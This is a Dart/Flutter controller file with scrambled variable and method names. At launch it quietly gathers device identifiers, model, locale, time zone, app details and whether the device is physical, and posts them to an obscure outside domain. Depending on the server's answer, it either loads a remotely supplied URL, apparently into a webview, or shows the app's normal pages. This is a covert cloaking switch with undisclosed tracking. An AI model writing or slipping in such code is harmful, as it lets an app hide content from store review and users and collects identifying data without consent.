import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var tbpurmvqol = RxBool(false);
  var eulfxovb = RxBool(true);
  var jlktywsf = RxString("");
  var hortense = RxBool(false);
  var volkman = RxBool(true);
  final zfwbryj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    khuflma();
  }


  Future<void> khuflma() async {

    hortense.value = true;
    volkman.value = true;
    eulfxovb.value = false;

    zfwbryj.post("https://tur-i.cuixi098.life/zlaibotexdcvwmrgpnfkhqujys",data: await nlqhmv()).then((value) {
      var cmnpdqtr = value.data["cmnpdqtr"] as String;
      var rzxt = value.data["rzxt"] as bool;
      if (rzxt) {
        jlktywsf.value = cmnpdqtr;
        marilie();
      } else {
        hermann();
      }
    }).catchError((e) {
      eulfxovb.value = true;
      volkman.value = true;
      hortense.value = false;
    });
  }

  Future<Map<String, dynamic>> nlqhmv() async {
    final DeviceInfoPlugin tkufpd = DeviceInfoPlugin();
    PackageInfo lqpuodw_zcgfvbw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pgysrflj = Platform.localeName;
    var kzmgow = currentTimeZone;

    var riylbk = lqpuodw_zcgfvbw.packageName;
    var wtcap = lqpuodw_zcgfvbw.version;
    var vetqsopf = lqpuodw_zcgfvbw.buildNumber;

    var aule = lqpuodw_zcgfvbw.appName;
    var cvztxns  = "";
    var mertieBartell = "";
    var vafuyjz = "";
    var alexisJacobi = "";
    var sofiaSatterfield = "";
    var joHansen = "";
    var jrzncms = "";


    var itnx = "";
    var tucwa = false;

    if (GetPlatform.isAndroid) {
      itnx = "android";
      var oytrkwp = await tkufpd.androidInfo;

      vafuyjz = oytrkwp.brand;

      jrzncms  = oytrkwp.model;
      cvztxns = oytrkwp.id;

      tucwa = oytrkwp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      itnx = "ios";
      var wfsroktnl = await tkufpd.iosInfo;
      vafuyjz = wfsroktnl.name;
      jrzncms = wfsroktnl.model;

      cvztxns = wfsroktnl.identifierForVendor ?? "";
      tucwa  = wfsroktnl.isPhysicalDevice;
    }
    var res = {
      "alexisJacobi" : alexisJacobi,
      "aule": aule,
      "wtcap": wtcap,
      "riylbk": riylbk,
      "jrzncms": jrzncms,
      "vafuyjz": vafuyjz,
      "kzmgow": kzmgow,
      "cvztxns": cvztxns,
      "pgysrflj": pgysrflj,
      "itnx": itnx,
      "sofiaSatterfield" : sofiaSatterfield,
      "tucwa": tucwa,
      "joHansen" : joHansen,
      "mertieBartell" : mertieBartell,
      "vetqsopf": vetqsopf,
    };
    return res;
  }

  Future<void> hermann() async {
    Get.offAllNamed("/root-page");
  }

  Future<void> marilie() async {
    Get.offAllNamed("/ground-page");
  }
}
